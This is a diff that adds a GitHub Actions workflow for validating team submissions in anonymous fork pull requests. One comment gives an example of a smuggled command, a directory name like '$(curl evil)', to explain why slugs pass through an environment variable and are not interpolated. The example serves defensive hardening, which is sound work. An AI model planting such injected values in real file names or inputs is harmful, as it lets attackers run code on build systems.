@@ -1,0 +1,58 @@
+name: validate
+
+# Runs on plain `pull_request` (not `pull_request_target`) so it never has
+# access to repo secrets — this repo takes anonymous fork PRs (M5 P1: no
+# login to submit), and validation here is stdlib-only Python that never
+# needs one. See M5-T6 / scripts/validate_submission.py for what each step
+# checks and why the compiler logic is a manual port rather than a checkout
+# of the (private) main AgentCanvas repo.
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Self-test the validator (fixtures)
+        run: python3 tests/test_validate_submission.py -v
+
+      - name: index.json is up to date
+        run: python3 scripts/build_index.py --check
+
+      - name: Determine changed teams
+        id: changed
+        run: |
+          base="${{ github.event.pull_request.base.sha }}"
+          head="${{ github.event.pull_request.head.sha }}"
+          slugs=$(git diff --name-only "$base" "$head" -- teams/ \
+            | awk -F/ 'NF>1 {print $2}' | sort -u)
+          echo "slugs<<EOF" >> "$GITHUB_OUTPUT"
+          echo "$slugs" >> "$GITHUB_OUTPUT"
+          echo "EOF" >> "$GITHUB_OUTPUT"
+          if [ -z "$slugs" ]; then
+            echo "count=0" >> "$GITHUB_OUTPUT"
+          else
+            echo "count=$(echo "$slugs" | wc -l | tr -d ' ')" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Validate changed team(s)
+        if: steps.changed.outputs.count != '0'
+        # Slugs come from attacker-controlled directory names in the PR diff —
+        # pass them through an env var rather than interpolating `${{ }}`
+        # straight into the script text, or a crafted slug like `$(curl evil)`
+        # becomes literal shell that CI would execute.
+        env:
+          CHANGED_SLUGS: ${{ steps.changed.outputs.slugs }}
+        run: python3 scripts/validate_submission.py $CHANGED_SLUGS
